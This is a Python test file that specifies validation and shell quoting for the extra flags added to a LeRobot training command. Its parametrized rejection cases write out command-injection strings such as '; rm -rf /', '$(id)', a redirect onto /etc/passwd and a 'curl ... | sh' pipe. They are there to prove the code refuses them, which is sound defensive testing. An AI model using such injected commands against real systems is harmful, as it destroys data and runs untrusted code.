# This project was developed with assistance from AI tools.
"""Blind-spec tests for the training step's data-loader flags in src/host-runner/host_runner.py."""
from __future__ import annotations

import inspect
import json
import subprocess
from pathlib import Path

import pytest

# what every training command ends with; the shell sees backslash-r and backslash-n, not CR and LF
TAIL = " 2>&1 | tr '\\r' '\\n' | grep -E 'loss:|End of training|rror'"

# the command as it was before the flags existed, written out in full for one fixed set of inputs
TODAY = ("lerobot-train --policy.path=/incumbent --dataset.repo_id=act-v3-train "
         "--dataset.root=/flywheel/datasets/act-v3-train --dataset.video_backend=pyav "
         "--policy.device=cuda --policy.push_to_hub=false --output_dir=/flywheel/train/act-v3 "
         "--steps=1234 --save_freq=1234 --log_freq=1000 2>&1 | tr '\\r' '\\n' | grep -E 'loss:|End of training|rror'")

# ---------------------------------------------------------------- shared fixtures and helpers


@pytest.fixture
def runner(load_runner):
    """A freshly imported host_runner with neither training variable set."""
    return load_runner(TRAIN_NUM_WORKERS=None, TRAIN_EXTRA_ARGS=None)


def _expected(pol: str, repo_id: str, root: str, candidate: str, steps: int, flags: str = "") -> str:
    """The training command around already-quoted pieces, flags spliced in ahead of the redirect."""
    return (f"lerobot-train --policy.path={pol} --dataset.repo_id={repo_id} "
            f"--dataset.root={root}/datasets/{repo_id} --dataset.video_backend=pyav "
            f"--policy.device=cuda --policy.push_to_hub=false --output_dir={root}/train/{candidate} "
            f"--steps={steps} --save_freq={steps} --log_freq=1000" + (f" {flags}" if flags else "") + TAIL)


class _Seams:
    """What the faked process seams were asked to run."""

    def __init__(self):
        self.scripts = []
        self.sh_calls = []

    @property
    def train_scripts(self) -> list:
        return [s for s in self.scripts if "lerobot-train" in s]


def _fake_seams(runner, monkeypatch) -> _Seams:
    """Replace in_image/sh with recorders and make any real process start fail the test."""
    seams = _Seams()

    def fake_in_image(*args, **kwargs):
        seams.scripts.append(args[0] if args else kwargs["script"])

    def fake_sh(*args, **kwargs):
        seams.sh_calls.append(args[0] if args else kwargs["cmd"])

    def no_real_process(*_a, **_kw):
        raise AssertionError("a real process must never be started from these tests")

    monkeypatch.setattr(runner, "in_image", fake_in_image)
    monkeypatch.setattr(runner, "sh", fake_sh)
    monkeypatch.setattr(subprocess, "run", no_real_process)
    monkeypatch.setattr(subprocess, "Popen", no_real_process)
    return seams


def _stage_training(fly: Path, repo_id: str, candidate: str, total_frames: int) -> None:
    """Lay out what train() reads: the dataset's meta/info.json and the checkpoint it expects afterwards."""
    meta = fly / "datasets" / repo_id / "meta"
    meta.mkdir(parents=True)
    (meta / "info.json").write_text(json.dumps({"total_episodes": 3, "total_frames": total_frames}))
    ck = fly / "train" / candidate / "checkpoints" / "last" / "pretrained_model"
    ck.mkdir(parents=True)
    (ck / "model.safetensors").write_bytes(b"")


# ---------------------------------------------------------------- 1. configuration read at import


def test_train_num_workers_defaults_to_empty_string(runner):
    """TRAIN_NUM_WORKERS is the empty string when the variable is unset."""
    assert runner.TRAIN_NUM_WORKERS == ""


def test_train_extra_args_defaults_to_empty_string(runner):
    """TRAIN_EXTRA_ARGS is the empty string when the variable is unset."""
    assert runner.TRAIN_EXTRA_ARGS == ""


def test_train_num_workers_read_from_env_as_a_string(load_runner):
    """TRAIN_NUM_WORKERS holds the environment value as a string, not an int."""
    runner = load_runner(TRAIN_NUM_WORKERS="24", TRAIN_EXTRA_ARGS=None)
    assert runner.TRAIN_NUM_WORKERS == "24"
    assert isinstance(runner.TRAIN_NUM_WORKERS, str)


def test_train_extra_args_read_from_env_verbatim(load_runner):
    """TRAIN_EXTRA_ARGS holds the environment value exactly as given."""
    value = "--batch_size=16   --policy.use_amp=true"
    runner = load_runner(TRAIN_NUM_WORKERS=None, TRAIN_EXTRA_ARGS=value)
    assert runner.TRAIN_EXTRA_ARGS == value
    assert isinstance(runner.TRAIN_EXTRA_ARGS, str)


def test_training_variables_are_not_normalised_or_validated_at_import(load_runner):
    """Import keeps the raw strings, padding and bad values included; checking them belongs to the run."""
    runner = load_runner(TRAIN_NUM_WORKERS=" 024 ", TRAIN_EXTRA_ARGS="--batch_size=16; id")
    assert runner.TRAIN_NUM_WORKERS == " 024 "
    assert runner.TRAIN_EXTRA_ARGS == "--batch_size=16; id"


# ---------------------------------------------------------------- 2. train_flags


def test_train_flags_signature(runner):
    """train_flags takes (num_workers: str = "", extra_args: str = "") and returns str."""
    sig = inspect.signature(runner.train_flags)
    params = list(sig.parameters.values())
    assert [p.name for p in params] == ["num_workers", "extra_args"]
    assert [p.default for p in params] == ["", ""]
    assert all(p.kind is inspect.Parameter.POSITIONAL_OR_KEYWORD for p in params)
    assert all(p.annotation in (str, "str") for p in params)
    assert sig.return_annotation in (str, "str")


def test_train_flags_with_no_arguments_is_empty(runner):
    """With nothing given there are no flags."""
    assert runner.train_flags() == ""
    assert runner.train_flags("", "") == ""


def test_train_flags_defaults_ignore_the_environment(load_runner):
    """The function is pure: its defaults are empty strings, not the module's configuration."""
    runner = load_runner(TRAIN_NUM_WORKERS="24", TRAIN_EXTRA_ARGS="--batch_size=16")
    assert runner.train_flags() == ""


@pytest.mark.parametrize("blank", [" ", "   ", "\t", "\n", " \t\n "])
def test_train_flags_whitespace_num_workers_contributes_nothing(runner, blank):
    """A num_workers of only whitespace is the same as none."""
    assert runner.train_flags(blank) == ""
    assert runner.train_flags(blank, "--batch_size=16") == "--batch_size=16"


@pytest.mark.parametrize(
    "num_workers, flag",
    [
        ("24", "--num_workers=24"),
        ("0", "--num_workers=0"),
        ("1", "--num_workers=1"),
        ("128", "--num_workers=128"),
        (" 024 ", "--num_workers=24"),
        ("000", "--num_workers=0"),
        ("24\n", "--num_workers=24"),
        ("\t8 ", "--num_workers=8"),
    ],
)
def test_train_flags_num_workers_is_normalised(runner, num_workers, flag):
    """A non-negative base-10 integer, padded or not, becomes --num_workers=<n>."""
    assert runner.train_flags(num_workers) == flag


@pytest.mark.parametrize(
    "num_workers",
    ["-1", "-24", "1.5", "4.0", "1e3", "0x10", "many", "auto", "true", "None", "4 8", "4,", "4;",
     "$(nproc)", "`nproc`", "--num_workers=4", "4 --batch_size=16"],
)
def test_train_flags_rejects_a_num_workers_that_is_not_a_non_negative_integer(runner, num_workers):
    """Negative numbers, floats, words and shell text in num_workers raise ValueError."""
    with pytest.raises(ValueError):
        runner.train_flags(num_workers)


def test_train_flags_invalid_num_workers_raises_even_with_valid_extra_args(runner):
    """A bad num_workers is not masked by good extra_args."""
    with pytest.raises(ValueError):
        runner.train_flags("lots", "--batch_size=16")


@pytest.mark.parametrize(
    "token",
    [
        "--batch_size=16",
        "--resume",
        "--policy.use_amp=true",
        "--dataset.image_transforms.enable=true",
        "--job_name=",
        "--policy.path=/models/act-v2/pretrained_model",
        "--wandb.entity=team@example.org",
        "--optimizer.betas=0.9,0.999",
        "--dataset.episodes=0:10",
        "--seed=-1",
        "--x=a+b-c",
        "--X.Y_z9=Q_9",
    ],
)
def test_train_flags_accepts_a_well_formed_token_unchanged(runner, token):
    """A --name or --name=value token inside the allowed character sets comes back as it went in."""
    assert runner.train_flags("", token) == token


def test_train_flags_extra_args_keep_their_order(runner):
    """Several tokens are emitted in the order given, joined by single spaces."""
    extra = "--policy.use_amp=true --batch_size=16 --resume"
    assert runner.train_flags("", extra) == extra


def test_train_flags_collapses_surrounding_and_repeated_whitespace(runner):
    """The result has single spaces between flags and none at either end."""
    assert runner.train_flags("", "  --batch_size=16 \t  --policy.use_amp=true  ") == \
        "--batch_size=16 --policy.use_amp=true"


def test_train_flags_newline_between_tokens_is_only_a_separator(runner):
    """An unquoted newline separates tokens like any whitespace and never reaches the result."""
    assert runner.train_flags("", "--batch_size=16\n--resume") == "--batch_size=16 --resume"


def test_train_flags_quoted_token_is_emitted_as_the_token(runner):
    """Tokens are what shlex.split yields, so quoting around a well-formed token falls away."""
    assert runner.train_flags("", "'--batch_size=16' \"--resume\"") == "--batch_size=16 --resume"


def test_train_flags_num_workers_comes_first(runner):
    """The --num_workers flag precedes the extra tokens, which keep their order."""
    assert runner.train_flags("24", "--batch_size=16 --policy.use_amp=true") == \
        "--num_workers=24 --batch_size=16 --policy.use_amp=true"
    assert runner.train_flags(num_workers=" 8 ", extra_args=" --resume ") == "--num_workers=8 --resume"


def test_train_flags_returns_a_string(runner):
    """The result is a plain str in every shape."""
    assert isinstance(runner.train_flags(), str)
    assert isinstance(runner.train_flags("4"), str)
    assert isinstance(runner.train_flags("4", "--resume"), str)


@pytest.mark.parametrize(
    "extra_args",
    [
        ";",
        "--batch_size=16;",
        "--batch_size=16;id",
        "--batch_size=16; rm -rf /",
        "--batch_size=16 ; id",
        "|",
        "--batch_size=16|tee",
        "--batch_size=16 | tee /tmp/x",
        "--batch_size=16 || id",
        "--batch_size=16&",
        "--batch_size=16 && id",
        "--job_name=$HOME",
        "--job_name=${HOME}",
        "--job_name=$(id)",
        "$(id)",
        "--job_name=`id`",
        "`id`",
        "--output=>/etc/passwd",
        "--input=<x",
        "--x=(a)",
        "--x={a,b}",
        "--x=a*",
        "--x=~",
        "--x=a!b",
        "--x=a#b",
        "--x=a%b",
        "--x=a\\\\b",
        "--x=a=b",
    ],
    ids=lambda s: repr(s),
)
def test_train_flags_rejects_shell_metacharacters(runner, extra_args):
    """Separators, pipes, expansions, redirects and any other character outside the value set raise ValueError."""
    with pytest.raises(ValueError):
        runner.train_flags("", extra_args)


@pytest.mark.parametrize(
    "extra_args",
    [
        "--job_name='two words'",
        '--job_name="two words"',
        "--job_name=two\\ words",
        "'--job_name=two words'",
        "--job_name='tab\there'",
        "--job_name='line\nbreak'",
    ],
    ids=lambda s: repr(s),
)
def test_train_flags_rejects_whitespace_inside_a_value(runner, extra_args):
    """Quoting or escaping cannot smuggle whitespace into a value."""
    with pytest.raises(ValueError):
        runner.train_flags("", extra_args)


@pytest.mark.parametrize("extra_args", ["'--batch_size=16\n'", "'--resume\n'", "'\n--resume'"], ids=lambda s: repr(s))
def test_train_flags_requires_a_full_match_newline_at_the_edge_included(runner, extra_args):
    """A token with a leading or trailing newline does not fully match and raises ValueError."""
    with pytest.raises(ValueError):
        runner.train_flags("", extra_args)


@pytest.mark.parametrize(
    "extra_args",
    [
        "-j",
        "-j 4",
        "-j=4",
        "-num_workers=4",
        "resume",
        "batch_size=16",
        "16",
        "--batch_size 16",
        "--",
        "--=16",
        "---batch_size=16",
        "--batch-size=16",
        "--batch/size=16",
        "--batch:size=16",
        "lerobot-train",
        "/bin/sh",
    ],
    ids=lambda s: repr(s),
)
def test_train_flags_rejects_single_dash_flags_bare_words_and_bad_names(runner, extra_args):
    """Only --name and --name=value are tokens; names hold letters, digits, underscore and dot."""
    with pytest.raises(ValueError):
        runner.train_flags("", extra_args)


@pytest.mark.parametrize("extra_args", ["--job_name=café", "--café=1", "--x=１"], ids=lambda s: repr(s))
def test_train_flags_rejects_characters_outside_ascii(runner, extra_args):
    """The character sets are the ASCII ones written in the pattern, not locale word characters."""
    with pytest.raises(ValueError):
        runner.train_flags("", extra_args)


def test_train_flags_one_bad_token_refuses_the_whole_value(runner):
    """A refused token anywhere raises, whatever surrounds it and whatever num_workers is."""
    with pytest.raises(ValueError):
        runner.train_flags("", "--batch_size=16 oops --resume")
    with pytest.raises(ValueError):
        runner.train_flags("24", "--batch_size=16 --resume ;")


def test_train_flags_unbalanced_quote_raises_value_error(runner):
    """What shlex.split cannot split is refused the same way."""
    with pytest.raises(ValueError):
        runner.train_flags("", "--job_name='unterminated")


@pytest.mark.parametrize(
    "num_workers, extra_args",
    [
        ("8", "--num_workers=4"),
        ("8", "--num_workers=8"),
        ("0", "--num_workers=0"),
        ("8", "--batch_size=16 --num_workers=4"),
        ("8", "--num_workers=4 --batch_size=16"),
        (" 8 ", "--num_workers=4"),
        ("8", "--num_workers"),
        ("8", "--num_workers="),
    ],
)
def test_train_flags_rejects_num_workers_given_twice(runner, num_workers, extra_args):
    """A --num_workers token in extra_args alongside num_workers raises ValueError, equal values included."""
    with pytest.raises(ValueError):
        runner.train_flags(num_workers, extra_args)


def test_train_flags_allows_num_workers_in_extra_args_when_it_is_the_only_source(runner):
    """Without num_workers, a --num_workers token in extra_args is a token like any other."""
    assert runner.train_flags("", "--num_workers=4") == "--num_workers=4"
    assert runner.train_flags("", "--batch_size=16 --num_workers=4") == "--batch_size=16 --num_workers=4"


# ---------------------------------------------------------------- 3. train_command


def test_train_command_signature(runner):
    """train_command takes (pol, repo_id, root, candidate, steps, flags="") and returns str."""
    sig = inspect.signature(runner.train_command)
    params = list(sig.parameters.values())
    assert [p.name for p in params] == ["pol", "repo_id", "root", "candidate", "steps", "flags"]
    assert all(p.kind is inspect.Parameter.POSITIONAL_OR_KEYWORD for p in params)
    assert [p.default for p in params[:5]] == [inspect.Parameter.empty] * 5
    assert params[5].default == ""
    assert [p.annotation for p in params[:4]] in (["str"] * 4, [str] * 4)
    assert params[4].annotation in (int, "int")
    assert params[5].annotation in (str, "str")
    assert sig.return_annotation in (str, "str")


def test_train_command_without_flags_is_todays_command(runner):
    """With no flags the string is the pre-existing command, byte for byte."""
    assert runner.train_command("/incumbent", "act-v3-train", "/flywheel", "act-v3", 1234) == TODAY


def test_train_command_empty_flags_is_todays_command(runner):
    """flags="" is the same as leaving flags out: no stray space ahead of the redirect."""
    assert runner.train_command("/incumbent", "act-v3-train", "/flywheel", "act-v3", 1234, "") == TODAY
    assert runner.train_command("/incumbent", "act-v3-train", "/flywheel", "act-v3", 1234, flags="") == TODAY


def test_train_command_puts_flags_between_log_freq_and_the_redirect(runner):
    """Non-empty flags follow --log_freq=1000 after one space, ahead of ' 2>&1 | ...'."""
    cmd = runner.train_command("/incumbent", "act-v3-train", "/flywheel", "act-v3", 1234,
                               flags="--num_workers=24 --batch_size=16")
    assert cmd == (
        "lerobot-train --policy.path=/incumbent --dataset.repo_id=act-v3-train "
        "--dataset.root=/flywheel/datasets/act-v3-train --dataset.video_backend=pyav "
        "--policy.device=cuda --policy.push_to_hub=false --output_dir=/flywheel/train/act-v3 "
        "--steps=1234 --save_freq=1234 --log_freq=1000 --num_workers=24 --batch_size=16"
        " 2>&1 | tr '\\r' '\\n' | grep -E 'loss:|End of training|rror'")


def test_train_command_accepts_every_argument_by_keyword(runner):
    """The parameter names are the specified ones."""
    cmd = runner.train_command(pol="/incumbent", repo_id="act-v3-train", root="/flywheel", candidate="act-v3",
                               steps=1234, flags="--resume")
    assert cmd == TODAY[: -len(TAIL)] + " --resume" + TAIL


def test_train_command_tail_carries_backslash_escapes_not_control_characters(runner):
    """tr is handed the two-character sequences backslash-r and backslash-n."""
    cmd = runner.train_command("/incumbent", "act-v3-train", "/flywheel", "act-v3", 1234, flags="--resume")
    assert cmd.endswith(TAIL)
    assert "tr '" + chr(92) + "r' '" + chr(92) + "n'" in cmd
    assert "\r" not in cmd
    assert "\n" not in cmd


def test_train_command_steps_fill_both_steps_and_save_freq(runner):
    """The step count is used for --steps and for --save_freq."""
    cmd = runner.train_command("/incumbent", "r", "/flywheel", "c", 40250)
    assert " --steps=40250 --save_freq=40250 --log_freq=1000 2>&1" in cmd


@pytest.mark.parametrize(
    "pol, quoted",
    [
        ("/incumbent", "/incumbent"),
        ("/data/prev model/pretrained_model", "'/data/prev model/pretrained_model'"),
        ("/x; rm -rf /", "'/x; rm -rf /'"),
        ("/x$(id)", "'/x$(id)'"),
        ("/it's/here", "'/it'\"'\"'s/here'"),
    ],
)
def test_train_command_quotes_the_policy_path_for_the_shell(runner, pol, quoted):
    """--policy.path carries shlex.quote(pol): untouched when safe, single-quoted otherwise."""
    cmd = runner.train_command(pol, "act-v3-train", "/flywheel", "act-v3", 1234)
    assert cmd == _expected(quoted, "act-v3-train", "/flywheel", "act-v3", 1234)


def test_train_command_uses_root_as_given(runner):
    """root arrives already shell-ready from the caller and is not quoted a second time."""
    cmd = runner.train_command("/incumbent", "act-v3-train", "'/srv/fly wheel'", "act-v3", 1234, flags="--resume")
    assert cmd == _expected("/incumbent", "act-v3-train", "'/srv/fly wheel'", "act-v3", 1234, "--resume")
    assert "--dataset.root='/srv/fly wheel'/datasets/act-v3-train " in cmd
    assert "--output_dir='/srv/fly wheel'/train/act-v3 " in cmd


def test_train_flags_and_train_command_start_nothing(runner, monkeypatch):
    """Both functions are pure: they build strings and run no stage."""
    seams = _fake_seams(runner, monkeypatch)
    flags = runner.train_flags("24", "--batch_size=16")
    runner.train_command("/incumbent", "act-v3-train", "/flywheel", "act-v3", 1234, flags=flags)
    assert seams.scripts == []
    assert seams.sh_calls == []


# ---------------------------------------------------------------- 4. train() wiring


def test_train_without_the_variables_runs_todays_command(load_runner, monkeypatch, tmp_path):
    """With neither variable set, the training stage gets the pre-existing command, byte for byte."""
    runner = load_runner(RUNNER_MODE="docker", FLYWHEEL_DATA=str(tmp_path), TRAIN_NUM_WORKERS=None,
                         TRAIN_EXTRA_ARGS=None)
    seams = _fake_seams(runner, monkeypatch)
    _stage_training(tmp_path, "act-v3-train", "act-v3", total_frames=617)

    runner.train("act-v3", "act-v3-train", str(tmp_path / "prev" / "pretrained_model"), 2.0)

    assert seams.train_scripts == [TODAY]


def test_train_adds_num_workers_from_the_environment(load_runner, monkeypatch, tmp_path):
    """TRAIN_NUM_WORKERS alone puts --num_workers=<n> ahead of the redirect."""
    runner = load_runner(RUNNER_MODE="docker", FLYWHEEL_DATA=str(tmp_path), TEACHER_PATH="/models/teacher",
                         TRAIN_NUM_WORKERS="24", TRAIN_EXTRA_ARGS=None)
    seams = _fake_seams(runner, monkeypatch)
    _stage_training(tmp_path, "act-v3-train", "act-v3", total_frames=617)

    runner.train("act-v3", "act-v3-train", "HF", 2.0)

    assert seams.train_scripts == [
        _expected("/models/teacher", "act-v3-train", "/flywheel", "act-v3", 1234, "--num_workers=24")]


def test_train_adds_extra_args_from_the_environment(load_runner, monkeypatch, tmp_path):
    """TRAIN_EXTRA_ARGS alone puts its tokens ahead of the redirect."""
    runner = load_runner(RUNNER_MODE="docker", FLYWHEEL_DATA=str(tmp_path), TEACHER_PATH="/models/teacher",
                         TRAIN_NUM_WORKERS=None, TRAIN_EXTRA_ARGS="--batch_size=16  --policy.use_amp=true")
    seams = _fake_seams(runner, monkeypatch)
    _stage_training(tmp_path, "act-v3-train", "act-v3", total_frames=617)

    runner.train("act-v3", "act-v3-train", "HF", 2.0)

    assert seams.train_scripts == [
        _expected("/models/teacher", "act-v3-train", "/flywheel", "act-v3", 1234,
                  "--batch_size=16 --policy.use_amp=true")]


def test_train_in_process_adds_both_and_normalises_num_workers(load_runner, monkeypatch, tmp_path):
    """In-process, both variables land in the command, the worker count normalised and the incumbent quoted once."""
    runner = load_runner(RUNNER_MODE="inprocess", FLYWHEEL_DATA=str(tmp_path), TRAIN_NUM_WORKERS=" 024 ",
                         TRAIN_EXTRA_ARGS="--batch_size=16 --resume")
    seams = _fake_seams(runner, monkeypatch)
    _stage_training(tmp_path, "act-v3-train", "act-v3", total_frames=617)
    incumbent = str(tmp_path / "prev model" / "pretrained_model")

    runner.train("act-v3", "act-v3-train", incumbent, 2.0)

    assert seams.train_scripts == [
        _expected(f"'{incumbent}'", "act-v3-train", runner.data_root(), "act-v3", 1234,
                  "--num_workers=24 --batch_size=16 --resume")]


def test_train_reads_the_module_configuration_when_it_runs(load_runner, monkeypatch, tmp_path):
    """train() passes the module's TRAIN_NUM_WORKERS and TRAIN_EXTRA_ARGS to train_flags at call time."""
    runner = load_runner(RUNNER_MODE="docker", FLYWHEEL_DATA=str(tmp_path), TEACHER_PATH="/models/teacher",
                         TRAIN_NUM_WORKERS=None, TRAIN_EXTRA_ARGS=None)
    seams = _fake_seams(runner, monkeypatch)
    _stage_training(tmp_path, "act-v3-train", "act-v3", total_frames=617)
    monkeypatch.setattr(runner, "TRAIN_NUM_WORKERS", "12")
    monkeypatch.setattr(runner, "TRAIN_EXTRA_ARGS", "--resume")

    runner.train("act-v3", "act-v3-train", "HF", 2.0)

    assert seams.train_scripts == [
        _expected("/models/teacher", "act-v3-train", "/flywheel", "act-v3", 1234, "--num_workers=12 --resume")]


@pytest.mark.parametrize("mode", ["docker", "inprocess"])
@pytest.mark.parametrize(
    "num_workers, extra_args",
    [
        ("-1", ""),
        ("1.5", ""),
        ("lots", ""),
        ("", "--batch_size=16; curl example.invalid | sh"),
        ("", "-j 4"),
        ("", "--job_name=$(id)"),
        ("8", "--num_workers=4"),
    ],
)
def test_train_with_an_invalid_value_raises_before_anything_is_started(load_runner, monkeypatch, tmp_path, mode,
                                                                        num_workers, extra_args):
    """A refused value surfaces as ValueError from train() with no stage and no command run."""
    runner = load_runner(RUNNER_MODE=mode, FLYWHEEL_DATA=str(tmp_path), TRAIN_NUM_WORKERS=None,
                         TRAIN_EXTRA_ARGS=None)
    seams = _fake_seams(runner, monkeypatch)
    _stage_training(tmp_path, "act-v3-train", "act-v3", total_frames=617)
    monkeypatch.setattr(runner, "TRAIN_NUM_WORKERS", num_workers)
    monkeypatch.setattr(runner, "TRAIN_EXTRA_ARGS", extra_args)

    with pytest.raises(ValueError):
        runner.train("act-v3", "act-v3-train", "HF", 2.0)

    assert seams.scripts == []
    assert seams.sh_calls == []
